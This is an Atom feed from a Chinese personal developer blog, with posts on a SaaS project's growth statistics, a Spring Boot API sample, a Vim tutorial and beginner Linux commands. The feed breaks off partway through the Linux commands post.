<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>老白开发</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://binyanbin.github.io/"/>
  <updated>2017-07-12T03:04:15.000Z</updated>
  <id>http://binyanbin.github.io/</id>
  
  <author>
    <name>严彬</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>餐链系统17半年总结</title>
    <link href="http://binyanbin.github.io/2017/06/30/meallink-2/"/>
    <id>http://binyanbin.github.io/2017/06/30/meallink-2/</id>
    <published>2017-06-29T16:00:00.000Z</published>
    <updated>2017-07-12T03:04:15.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;在线日志查询&quot;&gt;&lt;a href=&quot;#在线日志查询&quot; class=&quot;headerlink&quot; title=&quot;在线日志查询&quot;&gt;&lt;/a&gt;在线日志查询&lt;/h1&gt;&lt;p&gt;  提供正式环境在线日志服务，能在线查询访问日志，异常日志及超时响应日志。&lt;/p&gt;
&lt;h1 id=&quot;新版本管理方案&quot;&gt;&lt;a href=&quot;#新版本管理方案&quot; class=&quot;headerlink&quot; title=&quot;新版本管理方案&quot;&gt;&lt;/a&gt;新版本管理方案&lt;/h1&gt;&lt;p&gt;  由之前的单线，改为正式线，开发线及测试线相分离。需要紧急修复问题时，直接修改正式线的代码，进行发布。&lt;/p&gt;
&lt;h1 id=&quot;新人培训&quot;&gt;&lt;a href=&quot;#新人培训&quot; class=&quot;headerlink&quot; title=&quot;新人培训&quot;&gt;&lt;/a&gt;新人培训&lt;/h1&gt;&lt;p&gt;  建立新人入职培训机制:从搭环境，然后带着问题学习代码及业务，最后做培训成果测试，淘汰不合适公司的新人。&lt;/p&gt;
&lt;h1 id=&quot;系统安全&quot;&gt;&lt;a href=&quot;#系统安全&quot; class=&quot;headerlink&quot; title=&quot;系统安全&quot;&gt;&lt;/a&gt;系统安全&lt;/h1&gt;&lt;p&gt;  使用token+signature加强api接口安全,同时建立异常账户识别及处理的机制。&lt;/p&gt;
&lt;h1 id=&quot;按模块发布&quot;&gt;&lt;a href=&quot;#按模块发布&quot; class=&quot;headerlink&quot; title=&quot;按模块发布&quot;&gt;&lt;/a&gt;按模块发布&lt;/h1&gt;&lt;p&gt;  使用springboot进行业务拆分,一模块一人负责，版本发布安模块进行。&lt;/p&gt;
&lt;h1 id=&quot;系统发布流程&quot;&gt;&lt;a href=&quot;#系统发布流程&quot; class=&quot;headerlink&quot; title=&quot;系统发布流程&quot;&gt;&lt;/a&gt;系统发布流程&lt;/h1&gt;&lt;p&gt;  备份数据，执行数据升级脚本，依次发布各服务器进行验证,最后备份源码。&lt;/p&gt;
&lt;h1 id=&quot;服务器运维&quot;&gt;&lt;a href=&quot;#服务器运维&quot; class=&quot;headerlink&quot; title=&quot;服务器运维&quot;&gt;&lt;/a&gt;服务器运维&lt;/h1&gt;&lt;p&gt;  总结服务器常见问题及处理方法,建立运维定期工作内容及标准。&lt;/p&gt;
&lt;h1 id=&quot;建立线上问题反馈标准及线上数据申请修改标准&quot;&gt;&lt;a href=&quot;#建立线上问题反馈标准及线上数据申请修改标准&quot; class=&quot;headerlink&quot; title=&quot;建立线上问题反馈标准及线上数据申请修改标准&quot;&gt;&lt;/a&gt;建立线上问题反馈标准及线上数据申请修改标准&lt;/h1&gt;&lt;p&gt;  减少不必要的沟通&lt;/p&gt;
&lt;h1 id=&quot;系统增长情况&quot;&gt;&lt;a href=&quot;#系统增长情况&quot; class=&quot;headerlink&quot; title=&quot;系统增长情况&quot;&gt;&lt;/a&gt;系统增长情况&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;月份&lt;/th&gt;
&lt;th&gt;成交单数&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;17-01&lt;/td&gt;
&lt;td&gt;2945&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;17-02&lt;/td&gt;
&lt;td&gt;3100&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;17-03&lt;/td&gt;
&lt;td&gt;4670&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;17-04&lt;/td&gt;
&lt;td&gt;5877&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;17-05&lt;/td&gt;
&lt;td&gt;8155&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;17-06&lt;/td&gt;
&lt;td&gt;11094&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;月份&lt;/th&gt;
&lt;th&gt;用户数&lt;/th&gt;
&lt;th&gt;门店数&lt;/th&gt;
&lt;th&gt;日均接口访问&lt;/th&gt;
&lt;th&gt;接口访问峰值&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;17-01&lt;/td&gt;
&lt;td&gt;593&lt;/td&gt;
&lt;td&gt;22&lt;/td&gt;
&lt;td&gt;12000&lt;/td&gt;
&lt;td&gt;23000&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;17-06&lt;/td&gt;
&lt;td&gt;1273&lt;/td&gt;
&lt;td&gt;75&lt;/td&gt;
&lt;td&gt;80000&lt;/td&gt;
&lt;td&gt;140000&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;在线日志查询&quot;&gt;&lt;a href=&quot;#在线日志查询&quot; class=&quot;headerlink&quot; title=&quot;在线日志查询&quot;&gt;&lt;/a&gt;在线日志查询&lt;/h1&gt;&lt;p&gt;  提供正式环境在线日志服务，能在线查询访问日志，异常日志及超时响应日志。&lt;/p&gt;
&lt;h1 id=&quot;新版本管
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>springboot webapi示例</title>
    <link href="http://binyanbin.github.io/2017/05/17/springboot/"/>
    <id>http://binyanbin.github.io/2017/05/17/springboot/</id>
    <published>2017-05-16T16:00:00.000Z</published>
    <updated>2017-07-12T03:04:21.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;这是一个使用Spring Boot示例项目, 可以直接使它做生产环境的骨架，也可以当作一个学习示例，它集成了一个Web框架常用的东东。

你需要有的开发环境: JDK8+  Maven  JetBrainsIDEA  Mysql  Mongo  Redis  ActiveMQ  Solr
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&quot;Features&quot;&gt;&lt;a href=&quot;#Features&quot; class=&quot;headerlink&quot; title=&quot;Features&quot;&gt;&lt;/a&gt;Features&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;1) Spring Boot + MyBatis = Web API

2) 统一异常处理

3) 日志处理, 根据不同的active profile激活不同的日志级别

4) 多环境配置: 正式(prod)/开发(dev)/测试(test)/本地(local)

5) 对返回的JSON进行统一的封装

6) 使用YAML而不是properties

7) 使用配置类代替spring.xml

8) 单元测试(完善中)

9) 启用spring缓存管理

10) 集成mysql,mongod,redis,ActiveMQ,Solr

11) mongo日志存储,访问日志，异常日志,超时响应日志

12) mongo序列服务

13) 缓存配置服务

14) token+signature接口安全机制

15) mysql读写分离

16) ActiveMQ示例

17) Solr示例(完善中)
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&quot;Quick-Start&quot;&gt;&lt;a href=&quot;#Quick-Start&quot; class=&quot;headerlink&quot; title=&quot;Quick Start&quot;&gt;&lt;/a&gt;Quick Start&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;1) 初始化数据库, 在你自己的MySQL中执行/resource/user.sql

2) 运行Application.java
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/binyanbin/springboot-api&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;源码查看&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;这是一个使用Spring Boot示例项目,
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>餐链系统16年终总结</title>
    <link href="http://binyanbin.github.io/2017/01/25/meallink/"/>
    <id>http://binyanbin.github.io/2017/01/25/meallink/</id>
    <published>2017-01-24T16:00:00.000Z</published>
    <updated>2017-07-12T02:22:35.000Z</updated>
    
    <content type="html">&lt;p&gt;16年有幸参与了一个saas项目,也慢慢的知道前期客户及数据的累积是多么艰难，同时要运营一个saas项目，也是一个非常不容易的事情。&lt;/p&gt;
&lt;h2 id=&quot;到16年底的项目情况如下&quot;&gt;&lt;a href=&quot;#到16年底的项目情况如下&quot; class=&quot;headerlink&quot; title=&quot;到16年底的项目情况如下:&quot;&gt;&lt;/a&gt;到16年底的项目情况如下:&lt;/h2&gt;&lt;p&gt;系统租户共34个,注册账号863个,注册门店:38个,在使用门店:20个,供应商:300个 在使用供应商:77个&lt;br&gt;每天交易单:130个左右,每个单平均物料:7.8个,每天api访问次数为:13000次左右&lt;/p&gt;
&lt;h2 id=&quot;成交数的增长情况&quot;&gt;&lt;a href=&quot;#成交数的增长情况&quot; class=&quot;headerlink&quot; title=&quot;成交数的增长情况&quot;&gt;&lt;/a&gt;成交数的增长情况&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;月份&lt;/th&gt;
&lt;th&gt;成交单数&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;16-09&lt;/td&gt;
&lt;td&gt;1457&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;16-10&lt;/td&gt;
&lt;td&gt;1824&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;16-11&lt;/td&gt;
&lt;td&gt;2023&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;16-12&lt;/td&gt;
&lt;td&gt;3342&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;17-01&lt;/td&gt;
&lt;td&gt;3645&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;saas项目在初期的数据积累是比较缓慢，一方面推广的问题，一方面产品不成熟，也不急于推广。&lt;/p&gt;
&lt;h2 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h2&gt;&lt;h4 id=&quot;业务变动引起的问题&quot;&gt;&lt;a href=&quot;#业务变动引起的问题&quot; class=&quot;headerlink&quot; title=&quot;业务变动引起的问题&quot;&gt;&lt;/a&gt;业务变动引起的问题&lt;/h4&gt;&lt;p&gt;项目初期，业务变动是一个非常正常的事情，大多数创业公司也不会有足够的开发和测试。由于业务变动引起的系统的问题还是比较多，有一些边界问题和特殊情况没有考虑到，需要及时解决。这类问题也基本上也没有什么好办法，查看出错原因再修复它。&lt;br&gt;所以一个好的日志功能在saas系统中非常重要。不是每一个客户都会反馈问题，也许你可以在客户反馈前就把这个问题解决掉。比如在出错时系统能主动提醒你，如发短信或系统通知。然后你可以去查看原因并解决这个问题.让大部份客户都查觉不到问题的存在。&lt;/p&gt;
&lt;h4 id=&quot;系统宕机&quot;&gt;&lt;a href=&quot;#系统宕机&quot; class=&quot;headerlink&quot; title=&quot;系统宕机&quot;&gt;&lt;/a&gt;系统宕机&lt;/h4&gt;&lt;p&gt;服务宕机是一个非常严重的问题，在项目初期也很容易碰到，大多数是以下这几种原因引起的：&lt;br&gt;1.数据库连接数达到上限&lt;br&gt;2.数据库死锁某些记录死锁&lt;br&gt;3.服务器内存达到上限&lt;br&gt;一般来说saas系统初期都是单库，宕机的原因多半是数据库出问题了，常见的问题就是连接数达到上线。比如未释放连接，或数据库出现死锁引起无法释放连接。这此情况都碰到过。死锁出现的原因一般都是事务并发修改相同数据引起的。&lt;br&gt;常用解决方式：队列，锁或去事务。&lt;br&gt;服务器内存达上限，基本上是代码问题，需要有经验的开发人员去查代码。&lt;br&gt;同时要防止宕机，定时查看服务器和数据库的状态非常重要，这样我们或许可以提早发现一些问题，早一步做好防范措施。&lt;/p&gt;
&lt;p&gt;当然随着用户的增多，你还会遇到更多问题，同时你也会做出很多调整去解决这类问题，就像其它公司那样。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;16年有幸参与了一个saas项目,也慢慢的知道前期客户及数据的累积是多么艰难，同时要运营一个saas项目，也是一个非常不容易的事情。&lt;/p&gt;
&lt;h2 id=&quot;到16年底的项目情况如下&quot;&gt;&lt;a href=&quot;#到16年底的项目情况如下&quot; class=&quot;headerlink&quot; t
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>vim 一周入门</title>
    <link href="http://binyanbin.github.io/2016/12/10/vim/"/>
    <id>http://binyanbin.github.io/2016/12/10/vim/</id>
    <published>2016-12-09T16:00:00.000Z</published>
    <updated>2017-02-02T07:03:17.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;第1天&quot;&gt;&lt;a href=&quot;#第1天&quot; class=&quot;headerlink&quot; title=&quot;第1天&quot;&gt;&lt;/a&gt;第1天&lt;/h2&gt;&lt;p&gt;1) i → Insert 模式，按 ESC 回到 Normal 模式.&lt;br&gt;2) x → 删当前光标所在的一个字符。&lt;br&gt;3) :wq → 存盘 + 退出 (:w 存盘, :q 退出) （陈皓注：:w 后可以跟文件名）&lt;br&gt;4) dd → 删除当前行，并把删除的行存到剪贴板里&lt;br&gt;5) p → 粘贴剪贴板&lt;/p&gt;
&lt;h2 id=&quot;第2天&quot;&gt;&lt;a href=&quot;#第2天&quot; class=&quot;headerlink&quot; title=&quot;第2天&quot;&gt;&lt;/a&gt;第2天&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;各种插入模式&lt;br&gt;1) a → 在光标后插入&lt;br&gt;2) o → 在当前行后插入一个新行&lt;br&gt;3) O → 在当前行前插入一个新行&lt;br&gt;4) cw → 替换从光标所在位置后到一个单词结尾的字符&lt;/li&gt;
&lt;li&gt;简单的移动光标&lt;br&gt;1) 0 → 数字零，到行头&lt;br&gt;2) ^ → 到本行第一个不是blank字符的位置（所谓blank字符就是空格，tab，换行，回车等）&lt;br&gt;3) $ → 到本行行尾&lt;br&gt;4) g_ → 到本行最后一个不是blank字符的位置。&lt;br&gt;5) /pattern → 搜索 pattern 的字符串（陈皓注：如果搜索出多个匹配，可按n键到下一个）&lt;/li&gt;
&lt;li&gt;拷贝/粘贴 （陈皓注：p/P都可以，p是表示在当前位置之后，P表示在当前位置之前）&lt;br&gt;1) P → 粘贴&lt;br&gt;2) yy → 拷贝当前行当行于 ddP&lt;/li&gt;
&lt;li&gt;Undo/Redo&lt;br&gt;1) u → undo&lt;br&gt;2) &lt;c-r&gt; → redo&lt;/c-r&gt;&lt;/li&gt;
&lt;li&gt;打开/保存/退出/改变文件(Buffer)&lt;br&gt;1) :e &lt;path to=&quot;&quot; file=&quot;&quot;&gt;&lt;/path&gt; → 打开一个文件&lt;br&gt;2) :w → 存盘&lt;br&gt;3) :saveas &lt;path to=&quot;&quot; file=&quot;&quot;&gt;&lt;/path&gt; → 另存为 &lt;path to=&quot;&quot; file=&quot;&quot;&gt;&lt;/path&gt;&lt;br&gt;4) :x， ZZ 或 :wq → 保存并退出 (:x 表示仅在需要时保存，ZZ不需要输入冒号并回车)&lt;br&gt;5) :q! → 退出不保存 :qa! 强行退出所有的正在编辑的文件，就算别的文件有更改。&lt;br&gt;6) :bn 和 :bp → 你可以同时打开很多文件，使用这两个命令来切换下一个或上一个文件。（陈皓注：我喜欢使用:n到下一个文件）&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;第3-5天&quot;&gt;&lt;a href=&quot;#第3-5天&quot; class=&quot;headerlink&quot; title=&quot;第3-5天&quot;&gt;&lt;/a&gt;第3-5天&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;. → (小数点) 可以重复上一次的命令&lt;/li&gt;
&lt;li&gt;N&lt;command&gt; → 重复某个命令N次&lt;br&gt;下面是一个示例，找开一个文件你可以试试下面的命令：&lt;br&gt;1) 2dd → 删除2行&lt;br&gt;2) 3p → 粘贴文本3次&lt;br&gt;3) 100idesu [ESC] → 会写下 “desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu “&lt;br&gt;4) . → 重复上一个命令—— 100 “desu “.&lt;br&gt;5) 3. → 重复 3 次 “desu” (注意：不是 300，你看，VIM多聪明啊).&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;3.你要让你的光标移动更有效率，你一定要了解下面的这些命令，千万别跳过。&lt;br&gt;1). NG → 到第 N 行 （陈皓注：注意命令中的G是大写的，另我一般使用 : N 到第N行，如 :137 到第137行）&lt;br&gt;2). gg → 到第一行。（陈皓注：相当于1G，或 :1）&lt;br&gt;3). G → 到最后一行。&lt;br&gt;4). 按单词移动：&lt;br&gt;● w → 到下一个单词的开头。&lt;br&gt;● e → 到下一个单词的结尾。&lt;/p&gt;
&lt;p&gt;4.下面，让我来说说最强的光标移动：&lt;br&gt;1) % : 匹配括号移动，包括 (, {, [. （陈皓注：你需要把光标先移到括号上）&lt;br&gt;2) &lt;em&gt; 和 #: 匹配光标当前所在的单词，移动光标到下一个（或上一个）匹配单词（&lt;/em&gt;是下一个，#是上一个）&lt;br&gt;更快&lt;/p&gt;
&lt;p&gt;5.你一定要记住光标的移动，因为很多命令都可以和这些移动光标的命令连动。很多命令都可以如下来干：&lt;/p&gt;
&lt;p&gt;&lt;start position=&quot;&quot;&gt;&lt;command&gt;&lt;end position=&quot;&quot;&gt;&lt;br&gt;例如 0y$ 命令意味着：&lt;br&gt;1) 0 → 先到行头&lt;br&gt;2) y → 从这里开始拷贝&lt;br&gt;3) $ → 拷贝到本行最后一个字符&lt;br&gt;你可可以输入 ye，从当前位置拷贝到本单词的最后一个字符。&lt;br&gt;你也可以输入 y2/foo 来拷贝2个 “foo” 之间的字符串。&lt;br&gt;还有很多时间并不一定你就一定要按y才会拷贝，下面的命令也会被拷贝：&lt;br&gt;4) d (删除 )&lt;br&gt;5) v (可视化的选择)&lt;br&gt;6) gU (变大写)&lt;br&gt;7) gu (变小写)&lt;/end&gt;&lt;/start&gt;&lt;/p&gt;
&lt;h2 id=&quot;第6-7天&quot;&gt;&lt;a href=&quot;#第6-7天&quot; class=&quot;headerlink&quot; title=&quot;第6-7天&quot;&gt;&lt;/a&gt;第6-7天&lt;/h2&gt;&lt;p&gt;1.在当前行上移动光标: 0 ^ $ f F t T , ;&lt;br&gt;1) 0 → 到行头&lt;br&gt;2) ^ → 到本行的第一个非blank字符&lt;br&gt;3) $ → 到行尾&lt;br&gt;4) g_ → 到本行最后一个不是blank字符的位置。&lt;br&gt;5) fa → 到下一个为a的字符处，你也可以fs到下一个为s的字符。&lt;br&gt;6) t, → 到逗号前的第一个字符。逗号可以变成其它字符。&lt;br&gt;7) 3fa → 在当前行查找第三个出现的a。&lt;br&gt;8) F 和 T → 和 f 和 t 一样，只不过是相反方向。&lt;br&gt;9)还有一个很有用的命令是 dt” → 删除所有的内容，直到遇到双引号—— “。&lt;/p&gt;
&lt;p&gt;2.区域选择 &lt;action&gt;a&lt;object&gt; 或 &lt;action&gt;i&lt;object&gt;&lt;br&gt;在visual 模式下，这些命令很强大，其命令格式为&lt;/object&gt;&lt;/action&gt;&lt;/object&gt;&lt;/action&gt;&lt;/p&gt;
&lt;p&gt;&lt;action&gt;a&lt;object&gt; 和 &lt;action&gt;i&lt;object&gt;&lt;br&gt;1) action可以是任何的命令，如 d (删除), y (拷贝), v (可以视模式选择)。&lt;br&gt;2) object 可能是： w 一个单词， W 一个以空格为分隔的单词， s 一个句字， p 一个段落。也可以是一个特别的字符：”、 ‘、 )、 }、 ]。&lt;br&gt;假设你有一个字符串 (map (+) (“foo”)).而光标键在第一个 o 的位置。&lt;br&gt;3) vi” → 会选择 foo.&lt;br&gt;4) va” → 会选择 “foo”.&lt;br&gt;5) vi) → 会选择 “foo”.&lt;br&gt;6) va) → 会选择(“foo”).&lt;br&gt;7) v2i) → 会选择 map (+) (“foo”)&lt;br&gt;8) v2a) → 会选择 (map (+) (“foo”))&lt;/object&gt;&lt;/action&gt;&lt;/object&gt;&lt;/action&gt;&lt;/p&gt;
&lt;p&gt;3.块操作: &lt;c-v&gt;&lt;br&gt;块操作，典型的操作： 0 &lt;c-v&gt; &lt;c-d&gt; I– [ESC]&lt;br&gt;1) ^ → 到行头&lt;br&gt;2) &lt;c-v&gt; → 开始块操作&lt;br&gt;3) &lt;c-d&gt; → 向下移动 (你也可以使用hjkl来移动光标，或是使用%，或是别的)&lt;br&gt;4) I– [ESC] → I是插入，插入“–”，按ESC键来为每一行生效。&lt;/c-d&gt;&lt;/c-v&gt;&lt;/c-d&gt;&lt;/c-v&gt;&lt;/c-v&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;第1天&quot;&gt;&lt;a href=&quot;#第1天&quot; class=&quot;headerlink&quot; title=&quot;第1天&quot;&gt;&lt;/a&gt;第1天&lt;/h2&gt;&lt;p&gt;1) i → Insert 模式，按 ESC 回到 Normal 模式.&lt;br&gt;2) x → 删当前光标所在的一个字符。&lt;br&gt;3)
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>linux基本概念</title>
    <link href="http://binyanbin.github.io/2016/11/15/bash-2/"/>
    <id>http://binyanbin.github.io/2016/11/15/bash-2/</id>
    <published>2016-11-14T16:00:00.000Z</published>
    <updated>2017-02-02T07:05:43.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;用户&quot;&gt;&lt;a href=&quot;#用户&quot; class=&quot;headerlink&quot; title=&quot;用户&quot;&gt;&lt;/a&gt;用户&lt;/h2&gt;&lt;p&gt;sudo 超级管理员权限&lt;br&gt;groups 用户组 共享一些资源和权限&lt;/p&gt;
&lt;h2 id=&quot;权限管理&quot;&gt;&lt;a href=&quot;#权限管理&quot; class=&quot;headerlink&quot; title=&quot;权限管理&quot;&gt;&lt;/a&gt;权限管理&lt;/h2&gt;&lt;p&gt;查看文件权限 ls -l&lt;br&gt;修改权限&lt;br&gt;chmod u拥有者g群组o其它a所有 +加-减=设定 r读w写x执行&lt;br&gt;示例：chmod u=rwx,g+rx,o-x test.sh&lt;/p&gt;
&lt;h2 id=&quot;目录结构&quot;&gt;&lt;a href=&quot;#目录结构&quot; class=&quot;headerlink&quot; title=&quot;目录结构&quot;&gt;&lt;/a&gt;目录结构&lt;/h2&gt;&lt;p&gt;boot 开机相关&lt;br&gt;etc 配置文件&lt;br&gt;home 用户目录&lt;br&gt;mnt 挂载其它&lt;br&gt;opt 附加软件包&lt;br&gt;root 超级管理员目录&lt;br&gt;sbin 超组管理员的命令&lt;br&gt;bin 一般用户的命令&lt;br&gt;usr 用户于存储用户只读数据&lt;br&gt;var 不断变化的文件如日志邮件&lt;/p&gt;
&lt;h2 id=&quot;环境变量&quot;&gt;&lt;a href=&quot;#环境变量&quot; class=&quot;headerlink&quot; title=&quot;环境变量&quot;&gt;&lt;/a&gt;环境变量&lt;/h2&gt;&lt;p&gt;全局环境变量 export test =”aa”&lt;br&gt;局部环境变量 test =”aa”&lt;br&gt;环境变量存在内存中，重启后消失。&lt;br&gt;如果想开机使用:1)所有用户使用 /etc/profile export变量&lt;br&gt;2)当前用户使用 ~/.bash_profile 或~/.bashrc&lt;/p&gt;
&lt;h2 id=&quot;管道&quot;&gt;&lt;a href=&quot;#管道&quot; class=&quot;headerlink&quot; title=&quot;管道&quot;&gt;&lt;/a&gt;管道&lt;/h2&gt;&lt;p&gt;前面每一个进程的输出(stdout)直接作为下一个进程的输入(stdin)&lt;br&gt;ps -ef |grep nginx&lt;/p&gt;
&lt;h2 id=&quot;数据流重定向&quot;&gt;&lt;a href=&quot;#数据流重定向&quot; class=&quot;headerlink&quot; title=&quot;数据流重定向&quot;&gt;&lt;/a&gt;数据流重定向&lt;/h2&gt;&lt;p&gt;重定向有两种方式，一种是直接输出，使用一个大于号“&amp;gt;”实现；另一种是以附加的方式输出，使用两个大于号“&amp;gt;&amp;gt;”实现。前者会覆盖原始的输出内容，而后者会添加到文件最后。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;用户&quot;&gt;&lt;a href=&quot;#用户&quot; class=&quot;headerlink&quot; title=&quot;用户&quot;&gt;&lt;/a&gt;用户&lt;/h2&gt;&lt;p&gt;sudo 超级管理员权限&lt;br&gt;groups 用户组 共享一些资源和权限&lt;/p&gt;
&lt;h2 id=&quot;权限管理&quot;&gt;&lt;a href=&quot;#权限管理&quot;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>linux常用命令</title>
    <link href="http://binyanbin.github.io/2016/10/28/bash-1/"/>
    <id>http://binyanbin.github.io/2016/10/28/bash-1/</id>
    <published>2016-10-27T16:00:00.000Z</published>
    <updated>2016-11-14T12:59:17.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;目录及文件操作&quot;&gt;&lt;a href=&quot;#目录及文件操作&quot; class=&quot;headerlink&quot; title=&quot;目录及文件操作&quot;&gt;&lt;/a&gt;目录及文件操作&lt;/h2&gt;&lt;h3 id=&quot;ls&quot;&gt;&lt;a href=&quot;#ls&quot; class=&quot;headerlink&quot; title=&quot;ls&quot;&gt;&lt;/a&gt;ls&lt;/h3&gt;&lt;h4 id=&quot;列出当前目录文件及文件夹&quot;&gt;&lt;a href=&quot;#列出当前目录文件及文件夹&quot; class=&quot;headerlink&quot; title=&quot;列出当前目录文件及文件夹&quot;&gt;&lt;/a&gt;列出当前目录文件及文件夹&lt;/h4&gt;&lt;p&gt;格式: ls [选项] [目录名]&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-a&lt;/td&gt;
&lt;td&gt;–all 列出目录下的所有文件，包括以 . 开头的隐含文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-l&lt;/td&gt;
&lt;td&gt;除了文件名之外，还将文件的权限、所有者、文件大小等信息详细列出来&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-d&lt;/td&gt;
&lt;td&gt;–directory 将目录象文件一样显示，而不是显示其下的文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-h&lt;/td&gt;
&lt;td&gt;–human-readable 以容易理解的格式列出文件大小 (例如 1K 234M 2G)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-t&lt;/td&gt;
&lt;td&gt;以文件修改时间排序&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;示例&quot;&gt;&lt;a href=&quot;#示例&quot; class=&quot;headerlink&quot; title=&quot;示例&quot;&gt;&lt;/a&gt;示例&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ ls -al &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ ls &lt;span class=&quot;_&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;_&quot;&gt;-l&lt;/span&gt; /home&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ ls &lt;span class=&quot;_&quot;&gt;-l&lt;/span&gt; d*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ ls -alh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;cd&quot;&gt;&lt;a href=&quot;#cd&quot; class=&quot;headerlink&quot; title=&quot;cd&quot;&gt;&lt;/a&gt;cd&lt;/h3&gt;&lt;h4 id=&quot;目录切换&quot;&gt;&lt;a href=&quot;#目录切换&quot; class=&quot;headerlink&quot; title=&quot;目录切换&quot;&gt;&lt;/a&gt;目录切换&lt;/h4&gt;&lt;p&gt;格式: cd [目录名]&lt;/p&gt;
